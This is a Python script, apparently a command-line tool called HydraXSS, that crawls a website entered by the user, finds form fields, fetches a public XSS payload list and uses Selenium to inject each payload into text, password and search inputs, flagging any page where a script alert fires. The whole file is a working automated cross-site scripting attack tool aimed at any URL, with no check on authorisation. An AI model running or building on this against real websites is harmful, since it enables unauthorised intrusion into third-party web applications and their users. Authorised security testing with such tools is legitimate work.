import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert


def link_filter(ura):
    response = requests.get(ura)
    soup = BeautifulSoup(response.content, 'html.parser')
    link_list = []
    for link in soup.find_all(['a']):
        href = link.get('href')
        if href and ura in href:
            if href and href.startswith(('http', 'https')):
                link_list.append(href)
        elif href and href.startswith(('#', '/#')):
            pass
        elif href and href.startswith('//'):
            pass
        elif href and href.startswith('/'):
            link_list.append(ura + href)
    if len(link_list):
        length = len(link_list)
        print(length, "\033[91msuccessfully stolen links on\033[0m", ura)
    else:
        print("\033[94mNo other links on this page\033[0m")
    return link_list



def form_input_finder(ura):
    response = requests.get(ura)
    soup = BeautifulSoup(response.content, 'html.parser')
    form_input_list = []
    vulnerable_input_link = []
    filter_input = ['text', 'email', 'password', 'search']
    for form in soup.find_all(['form']):
        for input_tag in form.find_all('input'):
            if input_tag.has_attr('type') and input_tag['type'] in filter_input:
                form_input_list.append(input_tag)
                vulnerable_input_link.append(ura)
                if len(vulnerable_input_link):
                    print("\033[94mInputs field detected in\033[0m", ura)
                    return vulnerable_input_link
                else:
                    print("\033[94mNothing found\033[0m")



def form_input_intruder(ura):
    payload_list_url = 'https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt'
    response = requests.get(payload_list_url)
    payload_list = response.text.splitlines()
    inputs = form_input_finder(ura)
    web = webdriver.Chrome()
    web.set_window_size(1, 1)
    try:
        for link in inputs:
            web.get(link)
            web.implicitly_wait(1)
            print('\033[91mGoing to intrude in \033[0m'+link)
            for payload in payload_list:
                try:
                    text = web.find_element('xpath', "//input[@type='text']")
                    text.clear()
                    text.send_keys(payload)
                    verif1 = True
                except:
                    '''No text input find'''
                    verif1 = False
                try:
                    email = web.find_element('xpath', "//input[@type='email']")
                    email.clear()
                    email.send_keys("xss@domain.tld")
                    verif2 = True
                except:
                    '''No email input find'''
                    verif2 = False
                try:
                    password = web.find_element('xpath', "//input[@type='password']")
                    password.clear()
                    password.send_keys(payload)
                    verif3 = True
                except:
                    ''''No password input find'''
                    verif3 = False
                if verif1 or verif2 or verif3 is True:
                    try:
                        submit = web.find_element('xpath', "//button[@type='submit']")
                        submit.click()
                        try:
                            alert1 = Alert(web)
                            alert1.accept()
                            if alert1:
                                print('\033[93mXSS found with\033[0m ' + payload + ' \033[93min\033[0m ' + link)
                        except:
                            '''not vulnerable'''
                        try:
                            resubmit = web.find_element('xpath', "//input[@type='submit']")
                            resubmit.click()
                            try:
                                alert2 = Alert(web)
                                alert2.accept()
                                if alert2:
                                    print('\033[93mXSS found with\033[0m ' + payload + ' \033[93min\033[0m ' + link)
                            except:
                                '''not vulnerable'''
                        except:
                            pass
                    except:
                        try:
                            text.send_keys(Keys.ENTER)
                        except:
                            email.send_keys(Keys.ENTER)
                try:
                    search = web.find_element('xpath', "//input[@type='search']")
                    search.clear()
                    search.send_keys(payload)
                    search.send_keys(Keys.ENTER)
                    try:
                        alert3 = Alert(web)
                        alert3.accept()
                        if alert3:
                            print('\033[93mXSS found with\033[0m ' + payload + ' \033[93min\033[0m ' + link)
                    except:
                        '''Not vulnerable'''
                except:
                    '''No input found'''
                    pass
    except:
        pass

def hydraxss(ura):
    if form_input_intruder(ura) is None:
        print('\033[91mProvided url not exploitable\033[0m')
        print('\033[94mStill investigate ...\033[0m')
    links = link_filter(ura)
    if len(links) is None:
        exit()
    for link in links:
        try:
            form_input_intruder(link)
        except:
            print('\033[91mNothing vulnerable\033[0m')



print('\033[94m _   ___   _____________  ___   \033[0m \033[91m__   __ _____ _____ \033[0m')
print('\033[94m| | | \ \ / /  _  \ ___ \/ _ \  \033[0m \033[91m\ \ / //  ___/  ___|\033[0m')
print('\033[94m| |_| |\ V /| | | | |_/ / /_\ \ \033[0m \033[91m \ V / \ `--.\ `--. \033[0m')
print('\033[94m|  _  | \ / | | | |    /|  _  | \033[0m \033[91m /   \  `--. \`--. \ \033[0m')
print('\033[94m| | | | | | | |/ /| |\ \| | | | \033[0m \033[91m/ /^\ \/\__/ /\__/ /\033[0m')
print('\033[94m\_| |_/ \_/ |___/ \_| \_\_| |_/ \033[0m \033[91m\/   \/\____/\____/ \033[0m')
print('\033[90m             | Provided by @natekali |       \033[0m')
url = input('\033[93mScan the target : \033[0m')
try:
    hydraxss(url)
except:
    print('\033[95mThe provided url is not accessible\033[0m')
    print('\033[95mRetry with this syntax : https://example.com\033[0m')
    pass




